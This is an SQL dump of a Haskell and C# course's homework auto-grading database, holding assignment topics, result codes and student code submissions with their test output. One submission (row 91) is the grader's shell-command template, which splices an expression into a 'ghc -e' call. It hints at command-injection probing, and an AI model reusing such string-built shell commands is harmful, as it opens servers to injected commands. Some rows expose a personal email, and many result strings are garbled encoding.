-- phpMyAdmin SQL Dump
-- version 3.5.1
-- http://www.phpmyadmin.net
--
-- Хост: localhost
-- Время создания: Дек 02 2012 г., 21:10
-- Версия сервера: 5.5.24
-- Версия PHP: 5.3.5

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данных: `simuni`
--

-- --------------------------------------------------------

--
-- Структура таблицы `generalinfo`
--

CREATE TABLE IF NOT EXISTS `generalinfo` (
  `GeneralInfoID` int(11) NOT NULL AUTO_INCREMENT,
  `Name` varchar(30) NOT NULL,
  `Value` varchar(30) NOT NULL,
  PRIMARY KEY (`GeneralInfoID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Дамп данных таблицы `generalinfo`
--

INSERT INTO `generalinfo` (`GeneralInfoID`, `Name`, `Value`) VALUES
(1, 'CurrentHometaskID', '33');

-- --------------------------------------------------------

--
-- Структура таблицы `hometask`
--

CREATE TABLE IF NOT EXISTS `hometask` (
  `HometaskID` int(11) NOT NULL AUTO_INCREMENT,
  `Topic` varchar(200) NOT NULL,
  `Date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Deadline` date NOT NULL,
  PRIMARY KEY (`HometaskID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=34 ;

--
-- Дамп данных таблицы `hometask`
--

INSERT INTO `hometask` (`HometaskID`, `Topic`, `Date`, `Deadline`) VALUES
(1, 'Знакомство с Haskell, рекурсия, накапливающие параметры', '2012-03-08 20:00:00', '2012-09-14'),
(2, 'Дополнительные задачи к заданию 1', '0000-00-00 00:00:00', '2012-09-24'),
(3, 'Списки, функции высшего порядка', '2012-05-02 09:53:52', '2012-09-21'),
(4, 'Доп. задачи про списки', '2012-09-16 18:24:39', '2012-10-01'),
(5, 'Простые задачи про функции высшего порядка на "обычных" языках', '2012-09-17 19:03:33', '2012-10-02'),
(6, 'Пары, стандартные функции высш.порядка, деревья, списки списков', '2012-09-20 14:33:06', '2012-10-05'),
(7, 'Доп. задачи про пары и просто посложнее', '2012-09-21 11:27:01', '2012-10-08'),
(8, 'any для С# и С++', '2012-09-24 11:46:00', '2012-10-09'),
(9, 'Доп. задачи про foldr', '2012-09-29 11:59:40', '2012-10-15'),
(10, 'any для деревьев для С++ и C#', '2012-10-01 11:23:01', '2012-10-16'),
(11, 'Функция, как результат; list comprehension, резисторы', '2012-10-03 15:40:10', '2012-10-12'),
(12, 'Наборы, резисторы', '2012-10-05 13:16:13', '2012-10-22'),
(13, 'map и filter в C# и С++', '2012-10-08 12:12:46', '2012-10-23'),
(14, 'list comprehension, lazy, foldTree', '2012-10-11 16:44:02', '2012-10-19'),
(15, 'Кантор', '2012-10-14 08:08:24', '2012-10-29'),
(16, 'Замыкания', '2012-10-15 18:26:49', '2012-10-30'),
(17, 'Много простых задач', '2012-10-18 18:42:45', '2012-11-02'),
(18, 'Доп. задачи про бесконечные списки', '2012-10-20 21:12:17', '2012-11-05'),
(19, 'Генераторы', '2012-10-22 08:41:24', '2012-11-06'),
(20, 'knot и унификация', '2012-10-27 14:53:56', '2012-11-12'),
(21, 'Генераторы 1', '2012-10-27 14:54:48', '2012-11-13'),
(22, 'Классы, множества как функции и т.д.', '2012-11-01 15:04:58', '2012-11-16'),
(23, 'последовательности, show', '2012-11-03 08:43:10', '2012-11-19'),
(24, 'C# множества, как функции и merge', '2012-11-05 06:32:11', '2012-11-20'),
(25, 'Доп.задачи с контрольной', '2012-11-09 07:30:23', '2012-11-26'),
(26, 'Expr на C#', '2012-11-12 20:19:53', '2012-11-27'),
(27, 'Failure continuation и т.д.', '2012-11-15 13:21:29', '2012-11-23'),
(28, 'Чаще всех других, упростить, ферзи', '2012-11-17 13:16:59', '2012-12-03'),
(29, 'C# размещения и failure continuation', '2012-11-18 19:40:05', '2012-12-04'),
(30, '8 задач', '2012-11-22 19:09:33', '2012-11-29'),
(31, 'Черч - 1 и еще', '2012-11-25 19:52:19', '2012-12-10'),
(32, 'C# continuation', '2012-11-26 21:37:33', '2012-12-11'),
(33, 'Предпоследнее', '2012-11-29 20:04:47', '2012-12-07');

-- --------------------------------------------------------

--
-- Структура таблицы `result`
--

CREATE TABLE IF NOT EXISTS `result` (
  `ResultID` int(11) NOT NULL AUTO_INCREMENT,
  `Text` varchar(30) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`ResultID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=11 ;

--
-- Дамп данных таблицы `result`
--

INSERT INTO `result` (`ResultID`, `Text`) VALUES
(0, 'Не проверено'),
(1, 'Зачтено'),
(2, 'Не зачтено'),
(3, 'СПИСАНО');

-- --------------------------------------------------------

--
-- Структура таблицы `role`
--

CREATE TABLE IF NOT EXISTS `role` (
  `RoleID` int(11) NOT NULL AUTO_INCREMENT,
  `RoleName` varchar(30) NOT NULL,
  PRIMARY KEY (`RoleID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Дамп данных таблицы `role`
--

INSERT INTO `role` (`RoleID`, `RoleName`) VALUES
(1, 'student'),
(2, 'teacher');

-- --------------------------------------------------------

--
-- Структура таблицы `solution`
--

CREATE TABLE IF NOT EXISTS `solution` (
  `SolutionID` int(11) NOT NULL AUTO_INCREMENT,
  `TaskID` int(11) NOT NULL,
  `UserID` varchar(30) NOT NULL,
  `LoadTimestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `ResultID` int(11) NOT NULL,
  `Code` mediumtext NOT NULL,
  `TestResult` varchar(150) NOT NULL,
  PRIMARY KEY (`SolutionID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4490 ;

--
-- Дамп данных таблицы `solution`
--

INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(9, 12, 'alexey.solovyew@gmail.com', '2012-04-06 09:44:40', 1, 'lst x = [1..10]', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(13, 12, 'admin11', '2012-04-04 10:45:36', 2, 'gwqdgsEADVSRvarsv\r\n---blablabla', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(14, 12, 'admin11', '2012-03-22 08:12:58', 1, 'ygks\r\n--- cool!\r\ndpogkergokerm', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(15, 12, 'admin11', '2012-03-22 08:15:05', 2, 'gkuboinpinkiln', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(16, 12, 'admin11', '2012-04-04 11:13:28', 2, 'lst = [1..]', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(18, 12, 'admin11', '2012-04-01 23:22:33', 1, 'lst 0 = 1\r\nlst n = n*lst (n-1)\r\n\r\n', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(19, 12, 'admin11', '0000-00-00 00:00:00', 0, 'hsdgedgsdag\r\ngsdgsdgsdg\r\ngsdgsdgsdg\r\ngsdgsdgsdg\r\n', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(20, 12, 'admin11', '0000-00-00 00:00:00', 0, 'hsdgedgsdag\r\ngsdgsdgsdg\r\ngsdgsdgsdg\r\ngsdgsdgsdg\r\n', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(21, 12, 'admin11', '0000-00-00 00:00:00', 0, 'gsdgsdgsdg\r\ngsdgsdg\r\n---sdgismdfoisdmfiosd\r\nsgsdgdg', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(22, 12, 'admin11', '0000-00-00 00:00:00', 0, 'gsdgsdgsdg\r\ngsdgsdg\r\n---sdgismdfoisdmfiosd\r\nsgsdgdg', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(24, 12, 'admin11', '2012-04-04 11:12:57', 1, 'makeList n = filter (x->sin x > 0.99) [1..]', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "take 1 lst", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(25, 12, 'admin11', '2012-04-04 11:34:16', 0, '[1..100]', 'РќРµ СѓРґР°Р»РѕСЃСЊ РІС‹С‡РёСЃР»РёС‚СЊ РІС‹СЂР°Р¶РµРЅРёРµ "check [2,3,4]", РїСЂРѕРІРµСЂСЊС‚Рµ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ СЃРёРЅС‚Р°РєСЃРёСЃР°'),
(26, 12, 'admin11', '2012-04-06 09:18:40', 1, 'check _ = False', 'РҐРёС‚СЂС‹Р№ С‚РµСЃС‚ РЅРѕРјРµСЂ 1 РЅРµ РїСЂРѕР№РґРµРЅ :('),
(27, 12, 'admin11', '2012-04-06 09:31:09', 3, 'check x = (length x > 3)', '<br/>РўРµСЃС‚С‹ СѓСЃРїРµС?РЅРѕ РїСЂРѕР№РґРµРЅС‹!'),
(28, 12, 'admin11', '2012-04-11 17:23:09', 0, 'gtewgfwqe;gomwqr;emfw', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(29, 12, 'admin11', '2012-04-11 17:23:29', 0, 'check _ = True', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(30, 12, 'admin11', '2012-04-11 17:24:03', 0, 'bsgfsdabearhergrg', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(31, 16, 'admin11', '2012-04-11 17:24:19', 0, 'gsdag;owmgpoSMDGOPSAG', '<br/>Тесты успешно пройдены!'),
(32, 12, 'admin11', '2012-04-11 17:24:56', 0, 'KGOB;OMPM', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(33, 12, 'admin11', '2012-04-11 17:26:59', 0, 'KGOB;OMPM', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(34, 12, 'admin11', '2012-04-11 17:27:06', 0, '', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(35, 12, 'admin11', '2012-04-11 17:27:16', 0, 'check _ = True', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(36, 12, 'admin11', '2012-04-11 17:29:39', 0, 'fdsfadFASF', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(37, 12, 'admin11', '2012-04-11 17:30:06', 0, 'FAsfASCFSafasFAsfeaf', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(38, 12, 'admin11', '2012-04-11 17:30:11', 0, '', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(39, 12, 'admin11', '2012-04-11 17:36:47', 0, 'gdaGSDAGSDAG', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(40, 12, 'admin11', '2012-04-11 17:37:12', 0, 'FDSFDSgsdagsdJFGaof', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(41, 12, 'admin11', '2012-04-11 17:41:29', 0, 'VDSJNVSLDNV', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(42, 12, 'admin11', '2012-04-11 17:52:20', 0, 'gsdgsdag', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(43, 16, 'MIHAN', '2012-04-11 20:10:08', 0, 'haaaskell', '<br/>Тесты успешно пройдены!'),
(44, 16, 'MIHAN', '2012-04-11 20:10:49', 0, 'dffd', '<br/>Тесты успешно пройдены!'),
(45, 16, 'MIHAN', '2012-04-11 20:12:53', 2, 'ок', '<br/>Тесты успешно пройдены!'),
(46, 12, 'zarmi', '2012-04-12 16:36:07', 2, 'asdfasdf', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(47, 12, 'admin11', '2012-04-12 16:37:10', 0, 'ndgjhrtshrthrthrrth', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(48, 12, 'admin11', '2012-04-12 16:37:56', 0, 'check _ = True', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(49, 12, 'admin11', '2012-04-12 16:38:13', 0, 'check _ = True', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(50, 16, 'admin11', '2012-04-14 09:55:35', 0, 'bfdsbddsb', '<br/>Тесты успешно пройдены!'),
(51, 16, 'admin11', '2012-04-14 09:55:49', 0, 'gdg', '<br/>Тесты успешно пройдены!'),
(52, 12, 'admin11', '2012-04-14 09:55:53', 1, 'check _ = True', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(53, 12, 'zarmi', '2012-04-14 12:09:07', 0, '', 'Не удалось вычислить выражение "check [2,3,4]", проверьте правильность синтаксиса'),
(54, 18, 'alexey.solovyew@gmail.com', '2012-04-16 23:14:34', 2, 'fwefwfwqefphhdashasdhdfhdfhfdsh\r\n---LOLkhu', '<br/>Тесты успешно пройдены!'),
(55, 18, '419892', '2012-05-01 16:58:08', 0, '', '<br/>Тесты успешно пройдены!'),
(56, 18, '419892', '2012-05-01 16:59:43', 0, '', '<br/>Тесты успешно пройдены!'),
(57, 18, '419892', '2012-05-01 16:59:55', 0, '', '<br/>Тесты успешно пройдены!'),
(58, 18, '419892', '2012-05-01 17:00:11', 0, '', '<br/>Тесты успешно пройдены!'),
(59, 18, '419892', '2012-05-01 17:00:39', 0, '', '<br/>Тесты успешно пройдены!'),
(60, 18, 'asp', '2012-05-02 09:44:32', 0, 'summe = 1+1/(1+1/(1+1/(1+1)))', '<br/>Тесты успешно пройдены!'),
(61, 18, 'asp', '2012-05-02 09:45:07', 0, 'summe = 1.5', '<br/>Тесты успешно пройдены!'),
(62, 19, 'asp', '2012-05-02 09:46:33', 0, 'f n = n', '<br/>Тесты успешно пройдены!'),
(63, 20, 'asp', '2012-05-02 09:47:05', 0, 'f n = n', '<br/>Тесты успешно пройдены!'),
(64, 21, 'asp', '2012-05-02 09:47:33', 0, 'f n = n', '<br/>Тесты успешно пройдены!'),
(65, 22, 'asp', '2012-05-02 10:11:27', 0, 'reverse [1,2,3] = [3,2,1]', 'Не удалось вычислить выражение "reverse [1,2,3]", проверьте правильность синтаксиса'),
(66, 22, 'asp', '2012-05-02 10:16:44', 0, 'rev x = x', 'Выражение имеет неправильное значение: rev [1,2,3]'),
(67, 22, 'asp', '2012-05-02 10:17:18', 0, 'twtwrtwrtrw', 'Не удалось вычислить выражение "rev [1,2,3]", проверьте правильность синтаксиса'),
(68, 22, 'asp', '2012-05-02 10:17:55', 0, 'rev [1,2,3] = [3,2,1]', 'Не удалось вычислить выражение "rev []", проверьте правильность синтаксиса'),
(69, 22, 'asp', '2012-05-02 10:18:59', 0, 'rev [1,2,3] = [3,2,1]', 'Не удалось вычислить выражение "rev []", проверьте правильность синтаксиса'),
(70, 22, '419892', '2012-05-08 13:31:51', 0, '', 'Не удалось вычислить выражение "rev [1,2,3]", проверьте правильность синтаксиса'),
(71, 22, '419892', '2012-05-08 13:32:17', 0, 'reverse [1,2,3] = [3,2,1]', 'Не удалось вычислить выражение "rev [1,2,3]", проверьте правильность синтаксиса'),
(72, 22, '419892', '2012-05-08 13:32:32', 0, 'rev [1,2,3] = [3,2,1]', 'Не удалось вычислить выражение "rev []", проверьте правильность синтаксиса'),
(73, 22, '419892', '2012-05-08 13:32:46', 0, 'rev [1,2,3] = [3,2,1]', 'Не удалось вычислить выражение "rev []", проверьте правильность синтаксиса'),
(74, 22, '419892', '2012-05-08 13:33:00', 0, 'rev [1,2,3] = [3,2,1]\r\nrev _ = []', '<br/>Тесты успешно пройдены!'),
(75, 22, '419892', '2012-05-08 13:33:21', 2, 'rev [1,2,3] = [3,2,1]\r\n---не все случаи разобраны\r\nrev _ = []', '<br/>Тесты успешно пройдены!'),
(76, 18, '419892', '2012-08-26 16:06:12', 0, 'прыфпыфпрпр', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(77, 18, '517309', '2012-08-27 12:52:10', 0, 'f 1 = 2\r\nf n = 1 + 1/f (n-1)', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(78, 18, '517309', '2012-08-27 12:55:52', 0, 'f n = 2', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(79, 24, '517309', '2012-08-27 13:13:25', 3, 'b x = 1', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(80, 18, '419892', '2012-08-27 21:32:06', 0, 'heyehye', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(81, 18, '419892', '2012-08-27 21:33:37', 0, 'f n = 1 / ( 1 + f (n-1) )\r\nf 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(82, 18, '419892', '2012-08-27 21:34:00', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1) )', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(83, 18, '419892', '2012-08-27 21:34:16', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1) )', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(84, 18, '419892', '2012-08-27 21:35:45', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1) )', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(85, 18, '419892', '2012-08-27 21:35:52', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1) )', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(86, 18, '419892', '2012-08-27 21:38:36', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(87, 18, '419892', '2012-08-27 21:38:41', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(88, 18, '419892', '2012-08-27 21:39:05', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(89, 18, '419892', '2012-08-27 21:39:13', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(90, 18, '419892', '2012-08-27 21:39:24', 0, 'f 1 = 1\r\nf n = 1 / ( 1 + f (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(91, 18, '419892', '2012-08-27 21:40:57', 0, '"ghc -e "" . $row[Expression] . "" " . $real_file_path . " > ".$realresdir', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(92, 18, '419892', '2012-08-27 21:42:36', 0, 'fwefwef', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(93, 18, '419892', '2012-08-27 21:42:51', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(94, 18, '419892', '2012-08-27 21:43:27', 0, 'eFWEFWEF', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(95, 18, '419892', '2012-08-27 21:58:01', 0, 'fefwe', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(96, 18, '419892', '2012-08-27 21:58:47', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(97, 18, '419892', '2012-08-27 21:59:40', 0, 'fsafwq', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(98, 18, '419892', '2012-08-27 22:01:39', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(99, 18, '419892', '2012-08-27 22:03:03', 0, 'afwefewfewf', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(100, 18, '419892', '2012-08-27 22:04:02', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(101, 18, '419892', '2012-09-04 21:49:41', 0, 'GEWGWQEGFWEF', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(102, 18, '419892', '2012-09-04 21:51:17', 0, 'f 3 = 1.6666', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(103, 18, '419892', '2012-09-04 21:53:12', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(104, 18, '419892', '2012-09-04 21:57:49', 0, 'ffwfewfweqfwqef', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(105, 18, '419892', '2012-09-04 21:58:13', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(106, 18, '419892', '2012-09-04 22:00:02', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(107, 18, '419892', '2012-09-04 22:00:59', 0, 'f 1 = 1', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(108, 18, '419892', '2012-09-04 22:02:44', 0, 'f 1 = 1', 'Выражение имеет неправильное значение: f 1'),
(109, 18, '419892', '2012-09-04 22:03:58', 0, 'f 1 = 1', 'Выражение имеет неправильное значение: f 1'),
(110, 18, '419892', '2012-09-04 22:05:56', 0, 'f 1 = 0.5', 'Не удалось вычислить выражение "let phi = f 100 in (phi > 1.618) && (phi < 1.619)", проверьте правильность синтаксиса'),
(111, 18, '419892', '2012-09-04 22:07:46', 0, 'f 1 = 0.5', 'Не удалось вычислить выражение "let phi = f 100 in (phi > 1.618) && (phi < 1.619)", проверьте правильность синтаксиса'),
(112, 18, '419892', '2012-09-04 22:09:05', 0, 'f n = 0.5', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: При больших f получается замечательное число (первое описание - Евклид, примерно 300 г. до н.э.)'),
(113, 18, '419892', '2012-09-04 22:09:53', 2, 'f n = 0.5', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: При больших f получается замечательное число (первое описание - Евклид, примерно 300 г. до н.э.)'),
(114, 18, '517309', '2012-09-05 17:30:19', 0, 'f 1 = 2\r\nf n = 1 + 1/f (n-1)', 'Выражение имеет неправильное значение: f 1'),
(115, 18, '517309', '2012-09-05 17:33:23', 2, 'f 1 = 2\r\nf n = 1 + 1 / f (n-1)', '<br/>Тесты успешно пройдены!'),
(116, 19, '517309', '2012-09-05 17:48:18', 0, 'simsin n = sin(sum[1..n]) / sum(map sin [1..n])', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(117, 19, '517309', '2012-09-05 17:48:55', 0, 'simsin n = sin 1', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(118, 19, '517309', '2012-09-05 17:49:17', 1, 'sumsin n = sin(sum[1..n]) / sum(map sin [1..n])', '<br/>Тесты успешно пройдены!'),
(119, 20, '517309', '2012-09-05 17:50:31', 0, 'fact n = product [1..n]\r\n\r\nsumfact n = sum $ map fact [1..n]', 'Выражение имеет неправильное значение: sumfact 4'),
(120, 20, '517309', '2012-09-05 17:56:29', 1, 'sumfact n = sum $ map fact [1..n]\r\n\r\nfact n = product [1..n] ', '<br/>Тесты успешно пройдены!'),
(121, 18, '57458603', '2012-09-07 01:19:59', 1, 'f 1 = 2\r\nf n = 1 + 1 / f (n - 1)', '<br/>Тесты успешно пройдены!'),
(122, 18, '1384577', '2012-09-07 06:55:55', 0, ' f 0 = 1\r\n\n f n | n > 0 = 1 + 1 / f (n-1)\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(123, 18, '1384577', '2012-09-07 07:15:38', 0, 'f  :: Double -> Double \r\n\nf 0 = 1\r\n\nf n | n > 0 = 1 + 1 / f (n-1)\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(124, 18, '1730564', '2012-09-07 07:28:02', 1, 'f :: Integer -> Double\r\n   --- На самом деле тут тип f можно не описывать \r\n   --- (и практически вссюду можно не описывать). Хаскел сам определяет тип, и почти всегда правильно.\r\nf n | n < 0 = error "negative n"\r\n    | n == 0 = 1\r\n    | otherwise = 1 + 1 / (f (n - 1))	', '<br/>Тесты успешно пройдены!'),
(125, 20, '517309', '2012-09-07 07:44:37', 0, 'f x = 1', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(126, 20, '517309', '2012-09-07 07:45:42', 1, 'sumfact n = 1', 'Выражение имеет неправильное значение: sumfact 2'),
(127, 18, '1384577', '2012-09-07 08:00:40', 0, 'f 0 = 1\r\n\nf n | n > 0 = 1 + 1 / f (n-1)\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(128, 19, '1384577', '2012-09-07 08:49:18', 0, 's 0 = 0\r\n\r\ns n | n > 0 = s (n - 1) + sin n\r\n  --- Засчитано, но только это, конечно, не хвостовая рекурсия :(\r\n  --- Почему система тестирования не пропускает задач, я не знаю, наверное какой-то bug.. \r\n\r\n\r\nsumsin 0 = 0\r\n\r\nsumsin n | n > 0 = (sin (sum [1..n]))/(s n)\r\n', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(129, 20, '1384577', '2012-09-07 08:59:12', 0, 'fact 1 = 1\r\n\nfact n | n > 1 = fact (n - 1) * n\r\n\n\r\n\nsumfact 1 = 1\r\n\nsumfact n | n > 1 = sumfact (n - 1) + fact n\n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(130, 20, '1384577', '2012-09-07 09:00:38', 0, 'fact 1 = 1\r\nfact n | n > 1 = fact (n - 1) * n\r\n\r\nsumfact 1 = 1\r\nsumfact n | n > 1 = sumfact (n - 1) + fact n', '<br/>Тесты успешно пройдены!'),
(131, 20, '1384577', '2012-09-07 09:01:00', 0, 'fact 1 = 1\r\nfact n | n > 1 = fact (n - 1) * n\r\n\r\nsumfact 1 = 1\r\nsumfact n | n > 1 = sumfact (n - 1) + fact n', '<br/>Тесты успешно пройдены!'),
(132, 20, '1384577', '2012-09-07 09:01:52', 1, 'fact 1 = 1\r\nfact n | n > 1 = fact (n - 1) * n\r\n\r\nsumfact 1 = 1\r\nsumfact n | n > 1 = sumfact (n - 1) + fact n\r\n   --- И тут тоже вовосе не хвостовая рекурсия.. Да еще и неэффективно считает, каждыйраз пересчитывает факториал заново. ', '<br/>Тесты успешно пройдены!'),
